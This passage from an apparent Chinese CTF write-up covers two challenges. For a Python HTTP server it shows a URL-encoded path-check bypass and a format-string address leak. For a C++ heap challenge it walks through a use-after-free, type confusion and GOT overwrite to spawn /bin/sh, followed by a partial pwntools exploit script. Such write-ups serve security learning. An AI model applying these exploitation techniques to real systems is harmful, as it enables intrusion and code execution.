class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">translate_path</span>(<span class="params">self, path</span>):</span><br><span class="line">  path = path.split(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">  path = path.split(<span class="string">&#x27;#&#x27;</span>, <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">  trailing_slash = path.rstrip().endswith(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">  path = posixpath.normpath(unquote(path))</span><br><span class="line">  words = path.split(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">  words = <span class="built_in">filter</span>(<span class="literal">None</span>, words)</span><br><span class="line">  path = os.getcwd()</span><br><span class="line">  <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.dirname(word):</span><br><span class="line">      <span class="keyword">if</span> word <span class="keyword">in</span> (os.curdir, os.pardir):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        path = os.path.join(path, word)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> trailing_slash:</span><br><span class="line">          path += <span class="string">&#x27;/&#x27;</span></span><br><span class="line">          <span class="keyword">return</span> path</span><br></pre></td></tr></table></figure><p>我们看到其实对用户访问的路径进行了检查，但是需要注意的是这里的检查存在问题，也就是检查的对象是<code>self.path</code>，但是打开的文件却是<code>flag</code>。这两个不同，我们看一下<code>translate_path</code>中的逻辑，这里是对我们输入的路径进行了处理，得到<code>url</code>解码之后的部分，并去除了参数等。</p><p>那么这里我们就可以利用<code>url</code>编码进行绕过。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET %<span class="number">66</span>%<span class="number">6</span>c%<span class="number">61</span>%<span class="number">67</span> HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure><p>还有一个漏洞是格式化字符串漏洞，这里也是一个堆溢出的漏洞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># class BaseHTTPRequestHandler:</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_header</span>(<span class="params">self, keyword, value</span>):</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">type</span>(value) != <span class="built_in">bytes</span>:</span><br><span class="line">    value = value.encode()</span><br><span class="line">    <span class="keyword">if</span> self.request_version != <span class="string">&#x27;HTTP/0.9&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span> os_system == <span class="string">&#x27;Linux&#x27;</span>:</span><br><span class="line">        string = ctypes.c_buffer(<span class="number">1024</span>)</span><br><span class="line">        self.libc.sprintf(string, value)</span><br><span class="line">        self.wfile.write(<span class="string">&#x27;%s: %s\r\n&#x27;</span> % (keyword, string.value.decode()))</span><br></pre></td></tr></table></figure><p>这里很明显存在一个格式化字符串的漏洞，这是在<code>BaseHTTPRequestHandler</code>类中使用到的函数，我们看一下调用该函数的位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self.send_header(<span class="string">&#x27;Content-Type&#x27;</span>, self.error_content_type)</span><br><span class="line">self.send_header(<span class="string">&#x27;Server&#x27;</span>, self.version_string())</span><br><span class="line">self.send_header(<span class="string">&#x27;Date&#x27;</span>, self.date_time_string())</span><br><span class="line"><span class="keyword">if</span> self.set_cookie:</span><br><span class="line">  self.send_header(<span class="string">&#x27;Cookie&#x27;</span>, self.cookie)</span><br></pre></td></tr></table></figure><p>也就是说我们可以在这些成员变量中使用格式化字符串，<code>poc</code>如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  run ./ori_pwn</span><br><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Set-Cookie:  %p-%p-%p-%p</span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Server: BabyHTTP/<span class="number">0.0</span><span class="number">.1</span> Python/<span class="number">3.5</span><span class="number">.2</span></span><br><span class="line">Date: Thu, <span class="number">01</span> Apr <span class="number">2021</span> <span class="number">02</span>:<span class="number">04</span>:<span class="number">12</span> GMT</span><br><span class="line">Cookie: <span class="number">0x7ffff631d788</span><span class="number">-0x7ffff631d788</span><span class="number">-0x7ffff7f94fd8</span><span class="number">-0x5555555748c0</span></span><br><span class="line">Content-type: text/html</span><br><span class="line">Content-Length: <span class="number">20</span></span><br><span class="line">Last-Modified: Thu, <span class="number">01</span> Apr <span class="number">2021</span> <span class="number">01</span>:<span class="number">13</span>:<span class="number">49</span> GMT</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;hello world&lt;h1&gt;</span><br></pre></td></tr></table></figure><p>但是还不知道如何利用。</p><h2 id="c-pwn3"><a href="#c-pwn3" class="headerlink" title="c++ pwn3"></a>c++ pwn3</h2><p>题目类似于一个<code>auto pwn</code>，即每次链接的时候二进制都不相同。我们首先分一个二进制程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">init();</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;Drawf&gt;&gt;::<span class="built_in">vector</span>(&amp;vector_list);</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Choice: &quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;choice);</span><br><span class="line">  <span class="keyword">switch</span> ( choice )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      Create(&amp;vector_list);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      Get(&amp;vector_list);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      Delete(&amp;vector_list);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      Clone(&amp;vector_list);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      Set(&amp;vector_list);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      View(&amp;vector_list);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid.&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一共是提供了上面六种操作方法，其中<code>create</code>函数就是创建一个特定类型的<code>shared_ptr</code>，这里创建的<code>shared_ptr</code>会被<code>push back</code>到一个<code>vector</code>中，而创建的类型的名称是随机字符串，也就是每次名称都不相同。</p><p>经过调试发现，每种类型包含有四种关键的成员变量，<code>+0x0</code>的位置是一个<code>vtable</code>指针，指向该种类型特定的<code>vtable</code>的位置<code>+0x8</code>的位置存储的是<code>name</code>的位置，这是一个<code>strings</code>类型的变量。也就是说结构体偏移<code>0x10</code>位置存储的是字符串的长度（这一点需要注意，之后<code>operation ==</code>的时候会首先进行长度的比较）。</p><p>还有其他两个成员变量的偏移量不断变化，其中一个是<code>vector</code>，另一个是<code>a</code>。每次<code>create</code>的时候都会新分配一个类型的结构体，还有一个特定大小的<code>vector</code>。</p><p><code>get</code>函数就是输出<code>a</code>的内容。<code>delete</code>函数就是从<code>vector</code>中删除指定<code>name</code>的<code>shared_ptr</code>。注意的是这里只是删除了<code>shared_ptr</code>本身的地址空间，其<code>vector</code>并没有被删除或者说并没有调用对应的析构函数。</p><p><code>clone</code>函数则是将指定<code>name</code>的<code>shared_ptr</code>的<code>_M_ptr</code>重新<code>push_back</code>回去。这里就存在一个漏洞，因为从调试来看，<code>push_back</code>的<code>new_shared_ptr</code>和原来的<code>shared_ptr</code>的<code>_M_ptr</code>指针的内容相同，但是<code>_M_pi</code>不同。</p><p><code>Set</code>函数是每次四子节设置<code>vector</code>中<code>offset</code>的位置的内容</p><p><code>View</code>函数输出<code>vecrtor</code>中保存的所有类型的<code>shared_ptr</code>中的<code>name</code>。</p><p>通过调试发现了一个就是<code>UAF</code>的漏洞，即<code>clone,delete</code>之后会出现一个悬空指针，我们可以进行<code>double free</code>。同时需要注意的是，在<code>delete</code>之后，悬空指针<code>+0x8</code>的位置会被覆写为<code>pthread_tcache_struct</code>的地址，那么我们通过<code>view</code>就可以泄漏出<code>pthread_tcache_struct</code>的内容。</p><p>远程的<code>glibc</code>版本是<code>2.27 1.3/1.4</code>也就是开启了<code>tcache doule free</code>的<code>2.27</code>版本，那么这里的悬空指针我们就不能直接构造<code>double free</code>了，因为此时我们还没有能够修改<code>key</code>的方法。</p><p>这里利用的是类型混淆，或者说是伪造一个特定类型的<code>shared_ptr</code>。因为发现有种类型的<code>vector</code>的<code>size</code>正好与某种类型的<code>shared_ptr</code>的<code>size</code>相同。</p><p>那么这里我们用这种特定的<code>class</code>进行堆布局，是的<code>vector</code>申请的时候恰好申请到这种大小的<code>size</code>。那么此时<code>vector</code>对应的类型结构体所在的内存空间就链接起来了。那么此时我们全部释放，如果提前布局好<code>tcache</code>的话就可以触发内存合并。</p><p>触发完毕内存合并之后，就可以申请一个<code>vector</code>很大的类型，此时<code>vector</code>与上面释放的类型的结构体发生重叠，如果我们提前<code>clone</code>即构造<code>UAF</code>的话，那么就可以利用<code>set vector</code>的方式来伪造结构体中的<code>name</code>和<code>vector</code>。</p><p>那么利用伪造的<code>vector</code>就可以做到任意地址写。而<code>libc</code>基地址的泄漏可以利用<code>name,view</code>的调用链完成。即将<code>name</code>写为某个函数的<code>got</code>表地址。</p><p>任意地址写之后就考虑写什么的问题，这里可以直接覆写<code>free_hook</code>，然后利用<code>UAF</code>写入<code>/bin/sh</code>接着调用<code>delete</code>。</p><p>这里我是利用任意地址写，写<code>got</code>表，覆写<code>memcmp</code>函数的<code>got</code>表为<code>system</code>的地址，然后提前某个类型的<code>name</code>设定为<code>/bin/sh</code>，那么之后进行<code>get_dwaft</code>函数调用即对比<code>name</code>的时候就可以直接触发<code>getshell</code>。</p><blockquote><p>这个题目到这里其实还没有完成，因为远程的题目是不断变化的，vector的偏移一直在发生改变。虽然我们可以利用泄漏的pthread_tcache_struct来做到探测各种类型的size，但是之后vector的位置还是没有好的方法。</p><p>这里可以直接利用pwntools中的elf函数读取函数固定偏移处的值来获取vector的偏移。</p></blockquote><h3 id="myexp"><a href="#myexp" class="headerlink" title="myexp"></a>myexp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pwn3&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = [<span class="number">0x4f3d5</span>, <span class="number">0x4f432</span>, <span class="number">0x10a41c</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">type_list = [<span class="string">&quot;ynvaul&quot;</span>, <span class="string">&quot;wgxzEb&quot;</span>, <span class="string">&quot;qOwyJp&quot;</span>, <span class="string">&quot;uxPyxf&quot;</span>, <span class="string">&quot;PCVqej&quot;</span>, <span class="string">&quot;qzPSDm&quot;</span>, <span class="string">&quot;pJEJQH&quot;</span>, <span class="string">&quot;wMPWXa&quot;</span>, <span class="string">&quot;stlHxv&quot;</span>, <span class="string">&quot;pYwVfF&quot;</span>]</span><br><span class="line"><span class="comment"># size_list = [496, 496, 476, 28, 40, 940, 94, 168, 624, 916]</span></span><br><span class="line">size_list = []</span><br><span class="line">tcache_map = &#123;&#125;</span><br><span class="line">class_size_list = []</span><br><span class="line">type_addr = <span class="number">0x407ED8</span></span><br><span class="line">vtable_address = <span class="number">0x60C900</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># size_list = []</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_bin</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;==\n&#x27;</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">&#x27;\n===&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    os.system(<span class="string">&quot;echo %s | base64 -d &gt; ./pwn.xz&quot;</span> % data)</span><br><span class="line">    os.system(<span class="string">&quot;rm ./pwn&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;xz -d ./pwn.xz&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;chmod 777 ./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_type_list</span>():</span><br><span class="line">    pwn = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">    types = pwn.read(type_addr, <span class="number">70</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">70</span>, <span class="number">7</span>):</span><br><span class="line">        type_list.append(types[i:i + <span class="number">6</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx, name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;type? &#x27;</span>)</span><br><span class="line">    p.sendline(type_list[idx])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_by_name</span>(<span class="params">type_name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;type? &#x27;</span>)</span><br><span class="line">    p.sendline(type_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clone</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">name, offset, value</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;off val\n&quot;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line">    p.sendline(value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;name? &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_name</span>(<span class="params">i, index</span>):</span><br><span class="line">    <span class="keyword">return</span> type_list[i] + <span class="built_in">chr</span>(index + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_value</span>(<span class="params">name, offset, value</span>):</span><br><span class="line">    index = <span class="built_in">int</span>(offset / <span class="number">4</span>)</span><br><span class="line">    <span class="built_in">set</span>(name, index, <span class="built_in">str</span>(value &amp; <span class="number">0xffffffff</span>))</span><br><span class="line">    <span class="built_in">set</span>(name, index + <span class="number">1</span>, <span class="built_in">str</span>(value &gt;&gt; <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_vtable</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="keyword">return</span> vtable_address + index * <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_size_list</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;type? &#x27;</span>)</span><br><span class="line">    p.sendline(type_list[idx])</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    size = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line">    size_list.append(size)</span><br><span class="line">    p.sendline(<span class="built_in">chr</span>(<span class="number">0x61</span> + idx) * <span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_class_size_init</span>():</span><br><span class="line">    leak_name = <span class="string">&quot;a&quot;</span> * (<span class="number">0x240</span>)</span><br><span class="line">    create(<span class="number">0</span>, leak_name)</span><br><span class="line">    clone(leak_name)</span><br><span class="line">    delete(leak_name)</span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="built_in">chr</span>(<span class="number">0x61</span> + <span class="number">9</span>) * <span class="number">0x8</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;-&gt;&quot;</span>)</span><br><span class="line">    <span class="built_in">map</span> = p.recv(<span class="number">0x40</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">map</span>) - <span class="number">2</span>):</span><br><span class="line">        key = <span class="number">0x20</span> + <span class="number">0x10</span> * i</span><br><span class="line">        value = u8(<span class="built_in">map</span>[i:i + <span class="number">1</span>])</span><br><span class="line">        tcache_map.update(&#123;key: value&#125;)</span><br><span class="line">    <span class="built_in">print</span>(tcache_map)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_class_size</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        size_change_count = <span class="number">0</span></span><br><span class="line">        delete(<span class="built_in">chr</span>(<span class="number">0x61</span> + i) * <span class="number">8</span>)</span><br><span class="line">        show()</span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="number">9</span>:</span><br><span class="line">            p.recvuntil(<span class="built_in">chr</span>(<span class="number">0x61</span> + <span class="number">9</span>) * <span class="number">0x8</span>)</span><br><span class="line">            p.recvuntil(<span 